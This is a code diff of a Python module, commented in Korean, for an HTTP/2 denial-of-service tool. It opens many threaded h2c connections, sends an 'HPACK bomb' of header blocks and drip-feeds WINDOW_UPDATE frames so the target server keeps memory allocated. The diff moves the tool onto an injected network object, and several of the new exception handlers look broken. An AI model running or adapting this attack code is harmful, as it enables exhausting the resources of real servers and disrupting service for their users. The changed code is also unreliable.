@@ -4,7 +4,7 @@ import threading
 import time
 import smf
 
-from apps.utility.colors import *
+from apps.utility.colors import CC
 from argparse import Namespace
 from typing import Iterable, List, Tuple
 
@@ -161,20 +161,20 @@ def settings_payload(settings: Iterable[Tuple[int, int]]) -> bytes:
 
 
 # 통신 유지용
-def recv_exact(sock: socket.socket, n: int) -> bytes:
+def recv_exact(sock, n: int) -> bytes:
     chunks = bytearray()
 
     while len(chunks) < n:
         chunk = sock.recv(n - len(chunks))
-        if not chunk:
+        if not chunk.raw_bytes:
             raise EOFError("socket closed")
-        chunks += chunk
+        chunks += chunk.raw_bytes
 
     return bytes(chunks)
 
 
 # 통신 유지용
-def read_frame(sock: socket.socket) -> Tuple[int, int, int, bytes]:
+def read_frame(sock) -> Tuple[int, int, int, bytes]:
     hdr = recv_exact(sock, 9)
 
     length = int.from_bytes(hdr[:3], "big")
@@ -187,7 +187,7 @@ def read_frame(sock: socket.socket) -> Tuple[int, int, int, bytes]:
 
 
 # 통신 유지용
-def service_peer_frames(sock: socket.socket, seconds: float) -> dict:
+def service_peer_frames(sock, seconds: float) -> dict:
     counts = {
         "settings": 0,
         "ping": 0,
@@ -205,24 +205,24 @@ def service_peer_frames(sock: socket.socket, seconds: float) -> dict:
         try:
             frame_type, flags, _stream_id, payload = read_frame(sock)
 
-        except socket.timeout:
+        except sock.Timeout:
             continue
 
-        except (EOFError, OSError):
+        except (EOFError, sock.SocketError):
             break
 
         if frame_type == FRAME_SETTINGS and not (flags & FLAG_ACK):
             counts["settings"] += 1
             try:
                 sock.sendall(h2_frame(FRAME_SETTINGS, FLAG_ACK, 0, b""))
-            except OSError:
+            except sock.SocketError:
                 break
 
         elif frame_type == FRAME_PING and not (flags & FLAG_ACK):
             counts["ping"] += 1
             try:
                 sock.sendall(h2_frame(FRAME_PING, FLAG_ACK, 0, payload))
-            except OSError:
+            except sock.SocketError:
                 break
 
         elif frame_type == FRAME_GOAWAY:
@@ -245,7 +245,7 @@ def service_peer_frames(sock: socket.socket, seconds: float) -> dict:
 
 # hpack 헤더 블록 전송
 def send_header_block(
-    sock: socket.socket,
+    sock,
     stream_id: int,
     block: bytes,
     max_frame: int = 16384,
@@ -270,8 +270,9 @@ def send_header_block(
 
 
 # TCP 연결 이후 HTTP/2 연결 수립 함수 (HTTP h2c 방식에서 사용하는 방법)
-def connect_h2c(host: str, port: int, initial_window: int) -> socket.socket:
-    sock = socket.create_connection((host, port), timeout=5)
+def connect_h2c(net, host: str, port: int, initial_window: int):
+    sock = net.Socket()
+    sock.create_connection((host, port), timeout=5)
 
     # h2c direct mode:
     # TCP connect -> HTTP/2 client preface -> SETTINGS
@@ -296,7 +297,7 @@ def window_update_payload(amount: int) -> bytes:
 
 
 # Window_Update 요청을 전송 (Hpack Bomb을 처리한 후, 응답을 보내서 메모리가 풀리지 않도록 응답을 아주 조금씩 보낼 수 있게 지연시킴)
-def drip_window(sock: socket.socket, stream_ids: List[int], amount: int) -> None:
+def drip_window(sock, stream_ids: List[int], amount: int) -> None:
     if amount <= 0:
         return
 
@@ -313,10 +314,10 @@ def drip_window(sock: socket.socket, stream_ids: List[int], amount: int) -> None
 
 
 # HTTP/2 통신
-def run_connection(conn_id: int, args: Namespace, block: bytes) -> None:
+def run_connection(conn_id: int, args: Namespace, block: bytes, net) -> None:
     try:
-        sock = connect_h2c(args.host, args.port, args.initial_window)
-    except OSError as e:
+        sock = connect_h2c(net, args.host, args.port, args.initial_window)
+    except sock.SocketError as e:
         smf.printf(
             f"{CC.RED}conn={CC.RESET}{conn_id} {CC.RED}connect_failed={CC.RESET}{e}",
             flush=True,
@@ -332,14 +333,14 @@ def run_connection(conn_id: int, args: Namespace, block: bytes) -> None:
         for stream_id in stream_ids:
             frames += send_header_block(sock, stream_id, block)
 
-    except OSError as e:
+    except sock.SocketError as e:
         print(
             f"{CC.RED}conn={CC.RESET}{conn_id} {CC.RED}send_failed={CC.RESET}{e}",
             flush=True,
         )
         try:
             sock.close()
-        except OSError as e:
+        except sock.SocketError as e:
             smf.printd(f"Conn={conn_id} Sending Failed", e, level="ERROR")
         return
 
@@ -377,7 +378,7 @@ def run_connection(conn_id: int, args: Namespace, block: bytes) -> None:
         if args.drip_interval > 0 and time.monotonic() < stop_at:
             try:
                 drip_window(sock, stream_ids, args.drip_bytes)
-            except OSError as e:
+            except sock.SocketError as e:
                 smf.printd("CONNECTION FAILED", e, level="ERROR")
                 break
         else:
@@ -390,11 +391,11 @@ def run_connection(conn_id: int, args: Namespace, block: bytes) -> None:
 
     try:
         sock.close()
-    except OSError:
+    except sock.SocketError:
         smf.printd("CONNECTION FAILED", e, level="ERROR")
 
 
-def execute(options):
+def execute(options, net):
     host = options.get("IP")
     port = options.get("PORT")
     server = options.get("SERVER")
@@ -449,7 +450,7 @@ def execute(options):
     )
 
     threads = [
-        threading.Thread(target=run_connection, args=(i, conn, block), daemon=False)
+        threading.Thread(target=run_connection, args=(i, conn, block, net), daemon=False)
         for i in range(loop)
     ]
 
